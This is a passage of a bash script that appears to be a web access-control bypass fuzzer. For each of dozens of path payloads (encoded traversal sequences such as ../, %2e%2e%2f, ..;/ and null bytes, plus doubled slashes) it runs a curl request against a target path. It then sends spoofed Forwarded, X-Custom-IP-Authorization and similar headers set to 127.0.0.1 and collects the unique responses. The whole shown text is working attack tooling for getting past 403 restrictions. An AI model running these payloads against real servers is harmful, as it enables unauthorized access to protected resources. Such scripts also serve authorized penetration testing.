code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;x$PAT" -H "$user_agent")
print
echo -n "Payload [ ;x/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;x/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;x/$PAT" -H "$user_agent")
print
echo -n "Payload [ ;x; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;x;$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/;x;$PAT" -H "$user_agent")
print
echo -n "Payload [ & ]: "
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/&$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/&$PAT" -H "$user_agent")
print
echo -n "Payload [ % ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%$PAT" -H "$user_agent")
print
echo -n "Payload [ %09 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%09$PAT" -H "$user_agent")
print
echo -n "Payload [ ../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/../$PAT" -H "$user_agent")
print
echo -n "Payload [ ../%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ .././ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.././$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.././$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%00/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%00/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%00/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%0d/ ]"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%0d/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%0d/$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%5c ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%5c$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%5c$PAT" -H "$user_agent")
print
echo -n "Payload [ ..\ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..\\$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..\\$PAT" -H "$user_agent")
print
echo -n "Payload [ ..%ff/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%ff$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..%ff$PAT" -H "$user_agent")
print
echo -n "Payload [ %2e%2e%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e%2e%2f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e%2e%2f$PAT" -H "$user_agent")
print
echo -n "Payload [ .%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.%2e/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ %3f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3f$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%3f$PAT" -H "$user_agent")
print
echo -n "Payload [ %26 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%26$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%26$PAT" -H "$user_agent")
print
echo -n "Payload [ %23 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%23$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%23$PAT" -H "$user_agent")
print
echo -n "Payload [ %2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%2e$PAT" -H "$user_agent")
print
echo -n "Payload [ /. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.$PAT" -H "$user_agent")
print
echo -n "Payload [ ? ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/?$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/?$PAT" -H "$user_agent")
print
echo -n "Payload [ ?? ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/??$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/??$PAT" -H "$user_agent")
print
echo -n "Payload [ ??? ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/???$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/???$PAT" -H "$user_agent")
print
echo -n "Payload [ // ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///$PAT" -H "$user_agent")
print
echo -n "Payload [ /./ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//./$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//./$PAT" -H "$user_agent")
print
echo -n "Payload [ .//./ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.//./$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.//./$PAT" -H "$user_agent")
print
echo -n "Payload [ //?anything ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///?anything$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///?anything$PAT" -H "$user_agent")
print
echo -n "Payload [ # ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/#$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/#$PAT" -H "$user_agent")
print
echo -n "Payload [ / ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//$PAT" -H "$user_agent")
print
echo -n "Payload [ /.randomstring ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.randomstring$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//.randomstring$PAT" -H "$user_agent")
print
echo -n "Payload [ ..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/..;/$PAT" -H "$user_agent")
print
echo -n "Payload [ .html ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.html$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.html$PAT" -H "$user_agent")
print
echo -n "Payload [ %20/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%20/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/%20/$PAT" -H "$user_agent")
print
echo -n "Payload [ %20$PAT%20/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%20$PAT%20/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%20$PAT%20/$PAT" -H "$user_agent")
print
echo -n "Payload [ .json ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.json$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/.json$PAT" -H "$user_agent")
print
echo -n "Payload [ \..\.\ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/\..\.\\$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/\..\.\\$PAT" -H "$user_agent")
print
echo -n "Payload [ /* ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//*$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//*$PAT" -H "$user_agent")
print
echo -n "Payload [ ./. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/./.$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/./.$PAT" -H "$user_agent")
print
echo -n "Payload [ /*/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//*/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//*/$PAT" -H "$user_agent")
print
echo -n "Payload [ /..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//..;/$PAT" -H "$user_agent")
print
echo -n "Payload [%2e/$PAT ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ /%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//%2e/$PAT" -H "$user_agent")
print
echo -n "Payload [ //. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///.$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST///.$PAT" -H "$user_agent")
print
echo -n "Payload [ //// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/////$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST/////$PAT" -H "$user_agent")
print
echo -n "Payload [ /../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//../$PAT" -H "$user_agent")
print
echo -n "Payload [ ;$PAT/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;$PAT/$PAT" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$SCHEME://$VHOST//;$PAT/$PAT" -H "$user_agent")
print
echo -n "Access-Control-Allow-Origin Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Access-Control-Allow-Origin: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Access-Control-Allow-Origin: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Forwarded Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Forwarded: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Forwarded: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Forwarded-For Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Forwarded-For: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Forwarded-For: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Forwarded-For-IP Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Forwarded-For-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Forwarded-For-IP: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "Origin Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Origin: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "Origin: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Custom-IP-Authorization Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print
echo -n "X-Forwarded Payload:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "$URL" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "$URL" -H "$user_agent")
print

echo -e ${green}"All done, scan results in $PWD"${end}
echo -e ${green}"Now displaying unique results, inspect them manually (cat, bat, ...)"${end}
wc "$PWD"/*  | grep --color=never -F 'original.html'
wc "$PWD"/*  | grep -vF total | awk -F/ '!_[$1]++' | sort -n
